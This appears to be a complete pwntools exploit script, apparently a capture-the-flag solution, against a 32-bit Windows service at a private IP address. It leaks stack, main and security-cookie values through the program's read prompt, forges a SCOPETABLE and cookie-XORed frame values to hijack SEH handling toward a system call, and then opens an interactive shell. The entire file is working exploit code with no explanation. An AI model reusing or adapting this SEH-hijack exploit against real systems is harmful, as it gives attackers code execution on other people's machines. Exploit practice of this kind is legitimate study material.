#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'
context.arch = 'i386'

if(sys.argv[1] == 'l'):
	p = process('')
	elf = ELF('',checksec=False)

else:
	p = remote('192.168.0.121',10002)
	#elf = ELF('',checksec=False)
	pause()


def readAddress(address):
    ru('Do you want to know more?')
    sl('yes')
    ru('Where do you want to know')
    sl(str(address))
    ru('value is ')

    return int(p.recvline(),16)

###getAddress###

ru('stack address =')
stack = int(p.recvline(),16)

ru('main address =')
main = int(p.recvline(),16)

security_cookie = readAddress(main+12116)

log.success('stack:'+hex(stack))
log.success('main:'+hex(main))
log.success('security cookie:'+hex(security_cookie))



sl('n')

system = main + 733
var_next = stack + 212

###hijack SEH###
SCOPETABLE = [ 
    0x0FFFFFFFE, 
    0, 
    0x0FFFFFFCC,
    0, 
    0xFFFFFFFE, 
    system,
    ]

payload = 'A' * 16 + flat(SCOPETABLE).ljust(104 - 16, 'A') 
payload+= p32((stack + 156) ^ security_cookie) + 'B' * 32 
payload+= p32(var_next) + p32(main + 944) + p32((stack + 16) ^ security_cookie)



sl(payload)

###get shell###
ru('Do you want to know more?')
sl('yes')
ru('Where do you want to know')
sl('0')
ia()